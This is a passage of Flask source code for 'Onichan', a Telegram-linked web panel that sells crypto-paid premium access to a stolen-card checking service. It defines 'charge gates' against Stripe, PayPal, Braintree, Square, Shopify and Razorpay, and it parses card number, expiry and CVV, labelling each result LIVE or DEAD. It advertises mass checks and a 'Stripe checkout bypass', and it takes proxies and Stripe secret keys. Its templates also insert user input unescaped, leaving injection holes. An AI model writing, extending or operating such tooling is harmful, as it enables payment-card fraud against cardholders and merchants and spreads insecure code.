                background: rgba(0,255,0,0.15);
                border: 1px solid rgba(0,255,0,0.3);
                color: #90EE90;
                animation: successPop 0.5s ease-out;
            }}
            
            @keyframes shake {{
                0%, 100% {{ transform: translateX(0); }}
                25% {{ transform: translateX(-5px); }}
                75% {{ transform: translateX(5px); }}
            }}
            
            @keyframes successPop {{
                0% {{ transform: scale(0.8); opacity: 0; }}
                50% {{ transform: scale(1.05); }}
                100% {{ transform: scale(1); opacity: 1; }}
            }}
        </style>
    </head>
    <body>
        <div id="tg-auto-overlay" class="tg-auto-login" style="display:none;">
            <div class="spinner-big"></div>
            <p id="tg-auto-msg">Logging in via Telegram...</p>
        </div>
        <div class="floating-hearts">
            <div class="heart" style="left: 10%; animation-delay: 0.2s;">💜</div>
            <div class="heart" style="left: 20%; animation-delay: 1.2s;">✨</div>
            <div class="heart" style="left: 30%; animation-delay: 2.2s;">💟</div>
            <div class="heart" style="left: 40%; animation-delay: 0.7s;">🌟</div>
            <div class="heart" style="left: 50%; animation-delay: 3.2s;">💜</div>
            <div class="heart" style="left: 60%; animation-delay: 1.7s;">⭐</div>
            <div class="heart" style="left: 70%; animation-delay: 2.7s;">🦋</div>
            <div class="heart" style="left: 80%; animation-delay: 1s;">💕</div>
            <div class="heart" style="left: 90%; animation-delay: 3.7s;">✨</div>
        </div>
        <div class="login-page">
            <div class="login-box">
                <div class="sparkle-container">
                    <div class="sparkle" style="top: 10%; left: 15%; animation-delay: 0.2s;"></div>
                    <div class="sparkle" style="top: 25%; right: 10%; animation-delay: 0.7s;"></div>
                    <div class="sparkle" style="bottom: 25%; left: 10%; animation-delay: 1.2s;"></div>
                    <div class="sparkle" style="bottom: 10%; right: 15%; animation-delay: 1.7s;"></div>
                </div>
                <div class="login-icon">✨</div>
                <h1>Create Account</h1>
                <p>Register with your Telegram User ID</p>
                {'<div class="alert alert-error">' + error + '</div>' if error else ''}
                {'<div class="alert alert-success">' + success + '</div>' if success else ''}
                <form method="POST">
                    <input type="text" name="user_id" placeholder="💫 Telegram User ID" required inputmode="numeric">
                    <input type="password" name="password" placeholder="🔑 Create Password" required>
                    <input type="password" name="confirm_password" placeholder="🔐 Confirm Password" required>
                    <button type="submit" class="btn btn-primary">✨ Register</button>
                </form>
                <div style="display:flex;align-items:center;gap:12px;margin:20px 0 15px;">
                    <div style="flex:1;height:1px;background:linear-gradient(90deg,transparent,rgba(186,85,211,0.4),transparent);"></div>
                    <span style="color:rgba(255,255,255,0.5);font-size:0.85em;font-weight:600;">OR</span>
                    <div style="flex:1;height:1px;background:linear-gradient(90deg,transparent,rgba(186,85,211,0.4),transparent);"></div>
                </div>
                <div id="tg-btn-area" style="display:flex;justify-content:center;"></div>
                <p style="margin-top: 20px;">
                    <a href="/user/login" class="login-link">Already have an account? Login 💖</a>
                </p>
                <p class="help-text">
                    Get your ID: Send /myid to @Onichanbabybot
                </p>
            </div>
        </div>
        <script>
        (function(){{
            var tg = window.Telegram && window.Telegram.WebApp;
            if (tg && tg.initData && tg.initData.length > 0) {{
                var overlay = document.getElementById('tg-auto-overlay');
                overlay.style.display = 'flex';
                var fd = new FormData();
                fd.append('initData', tg.initData);
                fetch('/user/telegram_webapp_login', {{method:'POST', body:fd}})
                .then(function(r){{ return r.json(); }})
                .then(function(d){{
                    if (d.ok) {{
                        window.location.href = d.redirect;
                    }} else {{
                        overlay.style.display = 'none';
                    }}
                }})
                .catch(function(){{
                    overlay.style.display = 'none';
                }});
            }} else {{
                var area = document.getElementById('tg-btn-area');
                var s = document.createElement('script');
                s.src = 'https://telegram.org/js/telegram-widget.js?22';
                s.setAttribute('data-telegram-login', 'Onichanbabybot');
                s.setAttribute('data-size', 'large');
                s.setAttribute('data-radius', '14');
                s.setAttribute('data-auth-url', '{request.url_root.rstrip("/")}/user/telegram_callback');
                s.setAttribute('data-request-access', 'write');
                s.async = true;
                area.appendChild(s);
            }}
        }})();
        </script>
    </body>
    </html>
    """)

@app.route('/user/logout')
def user_logout():
    session.pop('user_id', None)
    return redirect('/user/login')

@app.route('/user')
@user_required
def user_dashboard():
    user_id = session.get('user_id')
    user_info = get_user_info(user_id)
    payments = get_user_payments(user_id)
    history = get_user_check_history(user_id, 5)
    
    type_badge = ""
    if user_info['type'] == 'owner':
        type_badge = '<span class="premium-badge">OWNER</span>'
    elif user_info['type'] == 'premium':
        type_badge = '<span class="premium-badge">PREMIUM</span>'
    else:
        type_badge = '<span class="free-badge">FREE</span>'
    
    history_html = ""
    for h in history:
        history_html += f"<tr><td>{h[:100]}...</td></tr>" if len(h) > 100 else f"<tr><td>{h}</td></tr>"
    
    pending_html = ""
    for p in payments['pending']:
        parts = p.split('|')
        if len(parts) >= 6:
            pending_html += f"<tr><td>{parts[3]}</td><td>${parts[4]}</td><td>{parts[5]}</td><td>Pending</td></tr>"
    
    return render_template_string(f"""
    <html>
    <head><title>Dashboard - Onichan User Panel</title>{USER_CSS}</head>
    <body>
        {get_user_sidebar('dashboard', 'Dashboard')}
        <div class="main">
            <div class="header">
                <h1>Welcome Back!</h1>
                {type_badge}
            </div>
            <div class="quick-actions">
                <a href="/user/premium" class="qa-chip" aria-label="Buy Premium">
                    <span class="qa-ico">💎</span><span>Buy Premium</span>
                </a>
                <a href="/wallet" class="qa-chip" aria-label="Top Up Wallet">
                    <span class="qa-ico">💰</span><span>Top Up Wallet</span>
                </a>
                <a href="/user/checker" class="qa-chip" aria-label="Check Card">
                    <span class="qa-ico">💳</span><span>Check Card</span>
                </a>
            </div>
            <div class="stats-grid">
                <div class="stat-card">
                    <h3>{user_id}</h3>
                    <p>Your User ID</p>
                </div>
                <div class="stat-card">
                    <h3>{user_info['type'].upper()}</h3>
                    <p>Account Type</p>
                </div>
                <div class="stat-card">
                    <h3>{user_info['premium_expiry'] or 'N/A'}</h3>
                    <p>Premium Expiry</p>
                </div>
                <div class="stat-card">
                    <h3>{len(payments['pending'])}</h3>
                    <p>Pending Payments</p>
                </div>
            </div>
            
            {f'''<div class="card">
                <h2>Pending Payments</h2>
                <table>
                    <tr><th>Plan</th><th>Amount</th><th>Crypto</th><th>Status</th></tr>
                    {pending_html}
                </table>
                <a href="/user/payments" class="btn btn-primary" style="margin-top: 15px;">View All Payments</a>
            </div>''' if pending_html else ''}
            
            <div class="card">
                <h2>Recent Check History</h2>
                <table>
                    <tr><th>Check Info</th></tr>
                    {history_html if history_html else '<tr><td>No checks yet</td></tr>'}
                </table>
                <a href="/user/history" class="btn btn-primary" style="margin-top: 15px;">View Full History</a>
            </div>
            
            {f'''<div class="alert alert-info">
                Upgrade to Premium for unlimited checks and faster processing!
                <a href="/user/premium" class="btn btn-primary" style="margin-left: 15px;">Get Premium</a>
            </div>''' if user_info['type'] == 'free' else ''}
        </div>
    </body>
    </html>
    """)

@app.route('/user/premium', methods=['GET', 'POST'])
@user_required
def user_premium():
    user_id = session.get('user_id')
    username = session.get('username', 'user')
    user_info = get_user_info(user_id)
    
    result_html = ""
    
    if request.method == 'POST':
        plan_key = request.form.get('plan')
        crypto = request.form.get('crypto', 'USDT')
        
        try:
            from modules.oxapay import create_invoice, SUPPORTED_CRYPTOS
            
            if plan_key and crypto in SUPPORTED_CRYPTOS:
                result = create_invoice(
                    user_id=user_id,
                    username=username,
                    plan_key=plan_key,
                    crypto=crypto,
                    callback_url=request.host_url.rstrip('/') + '/webhook/oxapay',
                    return_url=request.host_url.rstrip('/') + '/user/premium'
                )
                
                if result.get('error'):
                    result_html = f'<div class="alert alert-danger">{result["error"]}</div>'
                else:
                    payment_url = result.get('payment_url', '')
                    if payment_url:
                        return redirect(payment_url)
                    else:
                        result_html = f'''
                        <div class="card" style="background: linear-gradient(135deg, rgba(34,197,94,0.2), rgba(16,185,129,0.2)); border: 1px solid #22c55e;">
                            <h2 style="color: #22c55e;">Payment Created!</h2>
                            <p><strong>Plan:</strong> {result.get("plan", {}).get("name", "N/A")}</p>
                            <p><strong>Amount:</strong> ${result.get("amount", 0)} USD</p>
                            <p><strong>Crypto:</strong> {result.get("crypto", "USDT")}</p>
                            <p><strong>Order ID:</strong> <code>{result.get("order_id", "N/A")}</code></p>
                            <p><strong>Track ID:</strong> <code>{result.get("track_id", "N/A")}</code></p>
                            <p style="margin-top: 15px; color: #f59e0b;">Could not get payment URL. Please try again or contact support.</p>
                        </div>
                        '''
            else:
                result_html = '<div class="alert alert-danger">Invalid plan or cryptocurrency selected</div>'
        except Exception as e:
            result_html = f'<div class="alert alert-danger">Error: {str(e)}</div>'
    
    plans = [
        {'key': '1_week', 'name': '1 Week', 'price': 3, 'days': 7},
        {'key': '2_weeks', 'name': '2 Weeks', 'price': 5, 'days': 14},
        {'key': '1_month', 'name': '1 Month', 'price': 10, 'days': 30, 'popular': True},
        {'key': '3_months', 'name': '3 Months', 'price': 25, 'days': 90}
    ]
    
    cryptos = [
        ('USDT', 'Tether USD'),
        ('BTC', 'Bitcoin'),
        ('ETH', 'Ethereum'),
        ('TRX', 'Tron'),
        ('LTC', 'Litecoin'),
        ('DOGE', 'Dogecoin'),
        ('BNB', 'Binance Coin'),
        ('SOL', 'Solana'),
        ('TON', 'Toncoin')
    ]
    
    plans_html = ""
    for plan in plans:
        popular_badge = '<span style="background: linear-gradient(90deg, #ec4899, #8b5cf6); padding: 3px 8px; border-radius: 10px; font-size: 0.7em; margin-left: 5px;">POPULAR</span>' if plan.get('popular') else ''
        plans_html += f"""
        <div class="plan-card" style="background: linear-gradient(135deg, rgba(236,72,153,0.1), rgba(139,92,246,0.1)); border: 1px solid rgba(236,72,153,0.3); padding: 25px; border-radius: 15px; text-align: center;">
            <h3 style="color: #ec4899;">{plan['name']}{popular_badge}</h3>
            <p style="opacity: 0.7;">{plan['days']} days of Premium</p>
            <div class="price" style="font-size: 2em; margin: 15px 0; color: #22c55e;">${plan['price']}</div>
            <form method="POST" style="margin-top: 15px;">
                <input type="hidden" name="plan" value="{plan['key']}">
                <select name="crypto" style="width: 100%; padding: 10px; margin-bottom: 15px; background: rgba(0,0,0,0.3); border: 1px solid rgba(236,72,153,0.3); border-radius: 8px; color: white;">
                    {''.join([f'<option value="{c[0]}">{c[0]} - {c[1]}</option>' for c in cryptos])}
                </select>
                <button type="submit" class="btn btn-primary" style="width: 100%;">💎 Pay with Crypto</button>
            </form>
        </div>
        """
    
    return render_template_string(f"""
    <html>
    <head><title>Premium - Onichan User Panel</title>{USER_CSS}</head>
    <body>
        {get_user_sidebar('premium', 'Buy Premium')}
        <div class="main">
            <div class="header">
                <h1>🎀 Get Premium</h1>
            </div>
            
            {result_html}
            
            {f'<div class="alert alert-success">You are already a {user_info["type"].upper()}! Your access expires on: {user_info["premium_expiry"]}</div>' if user_info['type'] in ['premium', 'owner'] else ''}
            
            <div class="card">
                <h2>✨ Premium Benefits</h2>
                <ul style="list-style: none; padding: 0;">
                    <li style="padding: 10px 0;">✅ 20 cards per mass check</li>
                    <li style="padding: 10px 0;">✅ All 18+ charge gates access</li>
                    <li style="padding: 10px 0;">✅ Auto Hitter - Stripe checkout bypass</li>
                    <li style="padding: 10px 0;">✅ Priority support</li>
                    <li style="padding: 10px 0;">✅ No cooldown between checks</li>
                </ul>
            </div>
            
            <div class="card">
                <h2>💎 Choose Your Plan (Crypto Only)</h2>
                <div class="stats-grid" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px;">
                    {plans_html}
                </div>
                <p style="margin-top: 20px; opacity: 0.7; text-align: center;">
                    Powered by OxaPay • Secure crypto payments • Instant activation
                </p>
            </div>
        </div>
    </body>
    </html>
    """)

@app.route('/user/history')
@user_required
def user_history():
    user_id = session.get('user_id')
    history = get_user_check_history(user_id, 100)
    
    history_html = ""
    history_cards_html = ""
    import re as _re
    for h in history:
        history_html += f"<tr><td>{h}</td></tr>"
        # Try to extract a date prefix (first 19 chars usually) and the rest as detail
        m = _re.match(r'^\s*(\d{4}-\d{2}-\d{2}[ T]\d{2}:\d{2}(:\d{2})?)\s*[\|\-:]?\s*(.*)$', h)
        if m:
            when = m.group(1).replace('T', ' ')
            rest = m.group(3) or ''
        else:
            when = ''
            rest = h
        # Detect status keyword for color
        rest_lower = rest.lower()
        if 'approved' in rest_lower or 'live' in rest_lower or 'success' in rest_lower or 'charged' in rest_lower:
            st_color = '#4ade80'
            st_label = 'LIVE'
        elif 'declined' in rest_lower or 'dead' in rest_lower or 'incorrect' in rest_lower or 'fail' in rest_lower:
            st_color = '#ef4444'
            st_label = 'DEAD'
        else:
            st_color = '#a78bfa'
            st_label = 'INFO'
        when_html = f"<span style='font-size:0.75em;opacity:0.6;'>{when}</span>" if when else "<span></span>"
        history_cards_html += (
            f"<div class='pay-card'>"
            f"<div class='row' style='align-items:center;'>"
            f"<span style='color:{st_color};font-weight:700;font-size:0.8em;text-transform:uppercase;'>{st_label}</span>"
            f"{when_html}"
            f"</div>"
            f"<div class='row'><span style='font-family:monospace;font-size:0.8em;word-break:break-all;'>{rest}</span></div>"
            f"</div>"
        )

    return render_template_string(f"""
    <html>
    <head><title>History - Onichan User Panel</title>{USER_CSS}</head>
    <body>
        {get_user_sidebar('history', 'Check History')}
        <div class="main">
            <div class="header">
                <h1>Check History</h1>
            </div>
            <div class="card">
                <h2>Your Last 100 Checks</h2>
                <table class="pay-table-desktop">
                    <tr><th>Check Info</th></tr>
                    {history_html if history_html else '<tr><td>No checks yet. Start checking cards in the Telegram bot!</td></tr>'}
                </table>
                <div class="pay-cards">
                    {history_cards_html if history_cards_html else '<div style="opacity:0.5;text-align:center;padding:20px;">No checks yet. Start checking cards in the Telegram bot!</div>'}
                </div>
            </div>
        </div>
    </body>
    </html>
    """)

@app.route('/user/help')
@user_required
def user_help():
    return render_template_string(f"""
    <html>
    <head><title>Help & Support - Onichan</title>{USER_CSS}</head>
    <body>
        {get_user_sidebar('help', 'Help & Support')}
        <div class="main">
            <div class="header"><h1>Help & Support</h1></div>
            <div class="card">
                <h2>Need a hand?</h2>
                <p style="line-height:1.7;opacity:0.9;">
                    Reach the Onichan team on Telegram for fastest response.
                </p>
                <ul style="margin:15px 0 5px 18px;line-height:2;">
                    <li>Bot: <a href="https://t.me/Onichanbabybot" style="color:#ff69b4;">@Onichanbabybot</a></li>
                    <li>Support DM: <a href="https://t.me/Onichanbabybot" style="color:#ff69b4;">/support</a> inside the bot</li>
                    <li>Get your User ID: send <code>/myid</code> to the bot</li>
                </ul>
            </div>
            <div class="card">
                <h2>Common topics</h2>
                <div class="quick-actions" style="margin-top:5px;">
                    <a class="qa-chip" href="/user/payments"><span class="qa-ico">💳</span><span>My Payments</span></a>
                    <a class="qa-chip" href="/user/premium"><span class="qa-ico">💎</span><span>Premium Plans</span></a>
                    <a class="qa-chip" href="/user/settings"><span class="qa-ico">⚙️</span><span>Settings</span></a>
                </div>
            </div>
        </div>
    </body>
    </html>
    """)


@app.route('/user/payments')
@user_required
def user_payments():
    user_id = session.get('user_id')
    payments = get_user_payments(user_id)
    
    completed_html = ""
    completed_cards_html = ""
    for p in payments['completed']:
        parts = p.split('|')
        if len(parts) >= 6:
            completed_html += f"<tr><td>{parts[0][:19]}</td><td>{parts[3]}</td><td>{parts[4]}</td><td>{parts[5]}</td><td style='color: #4ade80;'>Complete</td></tr>"
            completed_cards_html += (
                f"<div class='pay-card'>"
                f"<div class='row' style='align-items:center;'>"
                f"<span style='color:#4ade80;font-weight:700;font-size:0.8em;text-transform:uppercase;'>Complete</span>"
                f"<span style='font-size:0.75em;opacity:0.6;'>{parts[0][:19]}</span>"
                f"</div>"
                f"<div class='row'><span class='lbl'>Plan</span><span>{parts[3]}</span></div>"
                f"<div class='row'><span class='lbl'>Amount</span><span style='color:#4ade80;font-weight:700;'>${parts[4]}</span></div>"
                f"<div class='row'><span class='lbl'>Method</span><span>{parts[5]}</span></div>"
                f"</div>"
            )
    
    def _time_ago(parts_list):
        import re
        from datetime import datetime as _dt
        for piece in parts_list:
            s = (piece or '').strip()
            m = re.match(r'(\d{4}-\d{2}-\d{2}[ T]\d{2}:\d{2}(:\d{2})?)', s)
            if m:
                try:
                    ts = m.group(1).replace('T', ' ')
                    fmt = "%Y-%m-%d %H:%M:%S" if len(ts) >= 19 else "%Y-%m-%d %H:%M"
                    dt = _dt.strptime(ts[:19] if len(ts) >= 19 else ts, fmt)
                    delta = (_dt.utcnow() - dt).total_seconds()
                    if delta < 0:
                        return "just now"
                    if delta < 60:
                        return f"{int(delta)}s ago"
                    if delta < 3600:
                        return f"{int(delta // 60)}m ago"
                    if delta < 86400:
                        return f"{int(delta // 3600)}h ago"
                    return f"{int(delta // 86400)}d ago"
                except Exception:
                    return ""
        return ""

    pending_html = ""
    pending_cards_html = ""
    for p in payments['pending']:
        parts = p.split('|')
        if len(parts) >= 6:
            ago = _time_ago(parts)
            ago_badge = f"<span style='color:#a78bfa;font-size:0.75em;'>{ago}</span>" if ago else "<span></span>"
            pending_html += f"<tr><td>{parts[0][:20]}</td><td>{parts[3]}</td><td>${parts[4]}</td><td>{parts[5]}</td><td style='color: #f59e0b;'>Pending</td></tr>"
            pending_cards_html += (
                f"<div class='pay-card'>"
                f"<div class='row' style='align-items:center;'><span style='color:#f59e0b;font-weight:700;font-size:0.8em;text-transform:uppercase;'>Pending</span>{ago_badge}</div>"
                f"<div class='row'><span class='lbl'>TXN ID</span><span style='font-family:monospace;font-size:0.85em;'>{parts[0][:20]}</span></div>"
                f"<div class='row'><span class='lbl'>Plan</span><span>{parts[3]}</span></div>"
                f"<div class='row'><span class='lbl'>Amount</span><span style='color:#4ade80;font-weight:700;'>${parts[4]}</span></div>"
                f"<div class='row'><span class='lbl'>Crypto</span><span>{parts[5]}</span></div>"
                f"</div>"
            )
    
    return render_template_string(f"""
    <html>
    <head><title>Payments - Onichan User Panel</title>{USER_CSS}</head>
    <body>
        {get_user_sidebar('payments', 'My Payments')}
        <div class="main">
            <div class="header">
                <h1>My Payments</h1>
            </div>
            
            <div class="card">
                <h2>Pending Payments</h2>
                <table class="pay-table-desktop">
                    <tr><th>TXN ID</th><th>Plan</th><th>Amount</th><th>Crypto</th><th>Status</th></tr>
                    {pending_html if pending_html else '<tr><td colspan="5">No pending payments</td></tr>'}
                </table>
                <div class="pay-cards">
                    {pending_cards_html if pending_cards_html else '<div style="opacity:0.5;text-align:center;padding:20px;">No pending payments</div>'}
                </div>
            </div>
            
            <div class="card">
                <h2>Completed Payments</h2>
                <table class="pay-table-desktop">
                    <tr><th>Date</th><th>Plan</th><th>Amount</th><th>Method</th><th>Status</th></tr>
                    {completed_html if completed_html else '<tr><td colspan="5">No completed payments yet</td></tr>'}
                </table>
                <div class="pay-cards">
                    {completed_cards_html if completed_cards_html else '<div style="opacity:0.5;text-align:center;padding:20px;">No completed payments yet</div>'}
                </div>
            </div>
        </div>
    </body>
    </html>
    """)

@app.route('/user/settings', methods=['GET', 'POST'])
@user_required
def user_settings():
    user_id = session.get('user_id')
    message = ""
    
    if request.method == 'POST':
        site = request.form.get('site', '').strip()
        proxy = request.form.get('proxy', '').strip()
        
        config = {'site': site, 'proxy': proxy}
        if save_user_config(user_id, config):
            message = "Settings saved successfully!"
        else:
            message = "Error saving settings"
    
    config = get_user_config(user_id)
    
    return render_template_string(f"""
    <html>
    <head><title>Settings - Onichan User Panel</title>{USER_CSS}</head>
    <body>
        {get_user_sidebar('settings', 'Settings')}
        <div class="main">
            <div class="header">
                <h1>Settings</h1>
            </div>
            
            {'<div class="alert alert-success">' + message + '</div>' if message else ''}
            
            <div class="card">
                <h2>Default Site & Proxy</h2>
                <p style="opacity: 0.7; margin-bottom: 20px;">Configure your default Shopify site and proxy for card checking</p>
                <form method="POST">
                    <div class="form-group">
                        <label>Default Site (Shopify)</label>
                        <input type="text" name="site" value="{config.get('site', '')}" placeholder="example.myshopify.com">
                    </div>
                    <div class="form-group">
                        <label>Proxy (ip:port:user:pass)</label>
                        <input type="text" name="proxy" value="{config.get('proxy', '')}" placeholder="192.168.1.1:8080:user:pass">
                    </div>
                    <button type="submit" class="btn btn-primary">Save Settings</button>
                </form>
            </div>
            
            <div class="card">
                <h2>Account Info</h2>
                <table>
                    <tr><td><strong>User ID:</strong></td><td>{user_id}</td></tr>
                    <tr><td><strong>Account Type:</strong></td><td>{get_user_info(user_id)['type'].upper()}</td></tr>
                    <tr><td><strong>Premium Expiry:</strong></td><td>{get_user_info(user_id)['premium_expiry'] or 'N/A'}</td></tr>
                </table>
            </div>
        </div>
    </body>
    </html>
    """)


# ============================================================
# CARD CHECKING TOOLS
# ============================================================

AVAILABLE_GATES = [
    # ── Original gates ──────────────────────────────────────
    {'id': 'se1',   'name': 'Stripe Charge',     'premium': False, 'group': 'STRIPE'},
    {'id': 'st',    'name': 'Stripe Auth',        'premium': True,  'group': 'STRIPE'},
    {'id': 'stm',   'name': 'Stripe Mass Auth',   'premium': False, 'group': 'STRIPE'},
    {'id': 'sor',   'name': '2$ Stripe',          'premium': True,  'group': 'STRIPE'},
    {'id': 'st5',   'name': '5$ Stripe',          'premium': True,  'group': 'STRIPE'},
    {'id': 'st12',  'name': '12$ Stripe',         'premium': True,  'group': 'STRIPE'},
    {'id': 'str',   'name': '15$ Stripe',         'premium': True,  'group': 'STRIPE'},
    {'id': 'dep',   'name': '49$ Stripe',         'premium': True,  'group': 'STRIPE'},
    {'id': 'rz',    'name': 'Razorpay ₹10',       'premium': True,  'group': 'OTHER'},
    {'id': 'sh',    'name': 'Shopify Auto',       'premium': True,  'group': 'OTHER'},
    {'id': 'bu',    'name': 'Braintree Auth',     'premium': True,  'group': 'OTHER'},
    {'id': 'sq',    'name': 'Square Auth',        'premium': True,  'group': 'OTHER'},
    {'id': 'pp',    'name': '1$ PayPal',          'premium': True,  'group': 'OTHER'},
    # ── Cybor gates ─────────────────────────────────────────
    # STRIPE gateway
    {'id': 'stv1',    'name': 'Stripe Auth V1',   'premium': False, 'group': 'STRIPE'},
    {'id': 'stv2',    'name': 'Stripe Auth V2',   'premium': False, 'group': 'STRIPE'},
    {'id': 'stv3',    'name': 'Stripe Auth V3',   'premium': False, 'group': 'STRIPE'},
    {'id': 'skbased', 'name': 'SKBASED CVV',      'premium': False, 'group': 'STRIPE',
     'needs_sk': True},
    # SHOPII gateway
    {'id': 'shopii1', 'name': 'Shopii #1',        'premium': True,  'group': 'SHOPII'},
    {'id': 'shopii2', 'name': 'Shopii #2',        'premium': False, 'group': 'SHOPII'},
    {'id': 'shopii3', 'name': 'Shopii #3',        'premium': False, 'group': 'SHOPII'},
    {'id': 'shopii4', 'name': 'Shopii #4',        'premium': False, 'group': 'SHOPII'},
    # PP gateway
    {'id': 'ppkb',  'name': 'PP KeyBased',        'premium': True,  'group': 'PP',
     'needs_pp_creds': True},
    {'id': 'pp2',   'name': 'PP #2',              'premium': True,  'group': 'PP'},
    # B3 gateway
    {'id': 'b31',   'name': 'B3 #1',              'premium': True,  'group': 'B3'},
    {'id': 'b32',   'name': 'B3 #2',              'premium': True,  'group': 'B3'},
]

def parse_card_flexible(card_text):
    """Parse card from text - supports multiple formats like bot"""
    card_data = card_text.strip().replace(" ", "").replace(":", "|").replace("/", "|")
    card_parts = card_data.split("|")
    
    cc = mm = yy = cvv = None
    
    if len(card_parts) >= 4:
        cc = card_parts[0][:16]
        mm = card_parts[1].zfill(2)
        yy = card_parts[2][-2:]
        cvv = card_parts[3][:4]
    elif len(card_parts) == 3:
        cc = card_parts[0][:16]
        date_part = card_parts[1]
        cvv = card_parts[2][:4]
        
        if len(date_part) == 4:
            mm = date_part[:2]
            yy = date_part[2:]
        elif len(date_part) == 2:
            import datetime
            mm = str(datetime.datetime.now().month).zfill(2)
            yy = date_part
        else:
            return None
    else:
        return None
    
    if not all(p and p.isdigit() for p in [cc, mm, yy, cvv]):
        return None
    
    if not (len(cc) >= 15 and len(mm) == 2 and len(yy) == 2 and len(cvv) >= 3):
        return None
    
    return cc, mm, yy, cvv

@app.route('/user/checker', methods=['GET', 'POST'])
@user_required
def user_checker():
    user_id = session.get('user_id')
    user_info = get_user_info(user_id)
    result = None
    error = None
    
    if request.method == 'POST':
        card = request.form.get('card', '').strip()
        gate = request.form.get('gate', 'se1')
        sk_key = request.form.get('sk_key', '').strip() or None
        pp_client_id = request.form.get('pp_client_id', '').strip() or None
        pp_client_secret = request.form.get('pp_client_secret', '').strip() or None
        
        if not card:
            error = "Please enter a card to check"
        else:
            try:
                parsed = parse_card_flexible(card)
                if parsed:
                    cc, mm, yy, cvv = parsed
                    
                    from modules.gate_checker import check_card_php
                    check_result = check_card_php(gate, cc, mm, yy, cvv, user_id,
                                                  sk_key=sk_key,
                                                  pp_client_id=pp_client_id,
                                                  pp_client_secret=pp_client_secret)
                    
                    message = check_result.get('message', 'No response')
                    message_lower = message.lower()
                    
                    if 'approved' in message_lower or 'success' in message_lower or 'charged' in message_lower or 'captured' in message_lower or 'authorized' in message_lower:
                        determined_status = 'approved'
                    elif 'declined' in message_lower or 'failed' in message_lower or 'error' in message_lower or 'invalid' in message_lower or 'expired' in message_lower:
                        determined_status = 'declined'
                    else:
                        determined_status = check_result.get('status', 'unknown')
                    
                    result = {
                        'card': f"{cc}|{mm}|{yy}|{cvv}",
                        'gate': gate,
                        'status': determined_status,
                        'message': message,
                        'time': check_result.get('time', 0)
                    }
                    
                    from config import DB_CHECK_LOG
                    try:
                        with open(DB_CHECK_LOG, 'a') as f:
                            f.write(f"{datetime.now()}|{user_id}|{cc[:6]}xxxx|{gate}|{result['status']}|{result['message'][:50]}\n")
                    except:
                        pass
                else:
                    error = "Invalid card format. Use: CC|MM|YY|CVV or CC|MMYY|CVV"
            except Exception as e:
                error = f"Check failed: {str(e)[:50]}"

    # Build grouped gate <select> with <optgroup> per gateway
    is_premium_user = user_info['type'] in ['premium', 'owner']
    groups_order = ['STRIPE', 'SHOPII', 'PP', 'B3', 'OTHER']
    grouped = {g: [] for g in groups_order}
    for gate in AVAILABLE_GATES:
        grp = gate.get('group', 'OTHER')
        grouped.setdefault(grp, []).append(gate)
    gates_html = ""
    for grp in groups_order:
        items = grouped.get(grp, [])
        if not items:
            continue
        gates_html += f'<optgroup label="── {grp} ──">'
        for g in items:
            disabled = 'disabled' if g['premium'] and not is_premium_user else ''
            lock_tag = ' 🔒' if g['premium'] and not is_premium_user else ''
            gates_html += f'<option value="{g["id"]}" {disabled}>{g["name"]}{lock_tag}</option>'
        gates_html += '</optgroup>'
    
    result_html = ""
    if result:
        status_class = 'result-approved' if result['status'].lower() == 'approved' else 'result-declined'
        status_display = '✅ APPROVED' if result['status'].lower() == 'approved' else '❌ DECLINED'
        result_html = f'''
        <div class="result-box {status_class}">
Card: {result['card']}
Gate: {result['gate'].upper()}
Status: {status_display}
Message: {result['message']}
Time: {result['time']}s
        </div>
        '''
    
    return render_template_string(f"""
    <html>
    <head><title>Card Checker - Onichan</title>{USER_CSS}
    <style>
    .gate-extra-field {{ margin-top: 10px; display: none; }}
    .gate-extra-field.visible {{ display: block; }}
    .gate-badge {{ display: inline-block; font-size: 10px; padding: 2px 6px; border-radius: 4px;
                   background: rgba(255,20,147,0.2); color: #ff1493; margin-left: 6px; }}
    </style>
    </head>
    <body>
        {get_user_sidebar('checker', 'Card Checker')}
        <div class="main">
            <div class="header">
                <h1>Card Checker</h1>
            </div>
            
            {'<div class="alert alert-error">' + error + '</div>' if error else ''}
            
            <div class="card">
                <h2>Check Single Card</h2>
                <form method="POST" id="checkForm">
                    <div class="form-group">
                        <label>Card (CC|MM|YY|CVV)</label>
                        <input type="text" name="card" placeholder="4111111111111111|12|25|123" required>
                    </div>
                    <div class="form-group">
                        <label>Select Gate</label>
                        <select name="gate" id="gateSelect" onchange="handleGateChange(this.value)">
                            {gates_html}
                        </select>
                    </div>

                    <div class="gate-extra-field" id="skField">
                        <div class="form-group">
                            <label>Stripe SK Key <span class="gate-badge">SKBASED CVV</span></label>
                            <input type="text" name="sk_key" placeholder="sk_live_xxxxx or sk_test_xxxxx">
                            <small style="color:#a78bfa;">Leave blank to use the platform default SK key (if configured)</small>
                        </div>
                    </div>

                    <div class="gate-extra-field" id="ppField">
                        <div class="form-group">
                            <label>PayPal Client ID <span class="gate-badge">PP KeyBased</span></label>
                            <input type="text" name="pp_client_id" placeholder="AxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxX">
                        </div>
                        <div class="form-group">
                            <label>PayPal Client Secret</label>
                            <input type="password" name="pp_client_secret" placeholder="Exxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx">
                        </div>
                    </div>
                    <button type="submit" class="btn btn-primary" id="checkBtn">Check Card</button>
                </form>
                <div id="loadingDiv" style="display: none; margin-top: 20px; text-align: center; padding: 20px; border: 2px solid #ff1493; border-radius: 8px; background: rgba(255, 20, 147, 0.1);">
                    <div style="font-size: 24px; margin-bottom: 10px;">⏳</div>
                    <div style="color: #ff1493; font-weight: bold; font-size: 16px;">Checking card...</div>
                    <div style="color: #a78bfa; font-size: 12px; margin-top: 10px;">Please wait, this may take 10-30 seconds</div>
                </div>
                {result_html}
                <script>
                    function handleGateChange(gateId) {{
                        var skField = document.getElementById('skField');
                        var ppField = document.getElementById('ppField');
                        skField.classList.remove('visible');
                        ppField.classList.remove('visible');
                        if (gateId === 'skbased') {{
                            skField.classList.add('visible');
                        }} else if (gateId === 'ppkb') {{
                            ppField.classList.add('visible');
                        }}
                    }}
                    document.getElementById('checkForm').addEventListener('submit', function() {{
                        document.getElementById('loadingDiv').style.display = 'block';
                        document.getElementById('checkBtn').disabled = true;
                        document.getElementById('checkBtn').style.opacity = '0.6';
                    }});
                    handleGateChange(document.getElementById('gateSelect').value);
                </script>
            </div>
            
            <div class="card">
